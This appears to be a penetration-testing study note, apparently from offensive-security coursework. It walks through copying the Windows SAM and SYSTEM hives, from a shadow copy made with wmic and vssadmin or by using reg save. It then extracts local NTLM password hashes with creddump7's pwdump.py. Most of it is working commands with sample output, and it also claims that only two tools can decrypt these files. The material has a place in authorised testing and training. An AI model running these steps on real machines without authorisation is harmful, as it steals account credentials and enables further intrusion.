# Windows Credentials - SAM database and Decryption.

## Via Shadow Volumes

1. Create a snapshot of the C drive through WMIC launched from an administrative command prompt.

```bash
C:\> wmic shadowcopy call create Volume='C:\'
```

2. Confirm that it worked, running vssadmin and list the existing shadow volumes.

```bash
C:\> vssadmin list shadows
```

3. Once the shadow volume is located, we can copy the SAM database from it's given path in the output of our previous command. 

NOTE :Run this command in a cmd prompt not in powershell

```bash
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
```

Now that we have copied the database, it is partially encrypted by either RC4 or AES. 

4. The encryption keys are stored in the SYSTEM file, copy it too into the shadow volume.

```bash
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
```

## Via Registery

We can also obtain them from the registry in the HKLM\sam and HKLM\system hives, but administrative permissions are required to read and copy.

```bash
C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
The operation completed successfully.

C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
The operation completed successfully.
```

## Decryption

The only two tools that can decrypt these files are Mimikatz and Creddump7.

1. Install creddump

```bash
sudo apt install python-crypto
sudo git clone https://github.com/Neohapsis/creddump7
cd creddump7/
```

2. Now inside creddump7 folder, use the pwdump.py python script to decrypt the NTLM hashes.

```bash
python pwdump.py /home/kali/system /home/kali/sam
```

We have successfully decrypted the SAM database and obtained the NTLM password hash for the local administrator account.
